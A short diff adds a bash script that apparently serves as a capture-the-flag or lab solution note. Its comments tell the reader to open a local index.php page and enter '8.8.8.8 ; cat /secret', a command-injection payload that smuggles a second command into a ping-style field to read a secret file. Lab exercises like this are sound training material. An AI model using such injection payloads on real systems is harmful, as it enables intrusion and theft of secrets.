@@ -1,0 +1,4 @@
+#!/bin/bash
+
+# Access URL http://0.0.0.0:10002/index.php and enter '8.8.8.8 ; cat /secret'.
+# Get the secret from the output form.
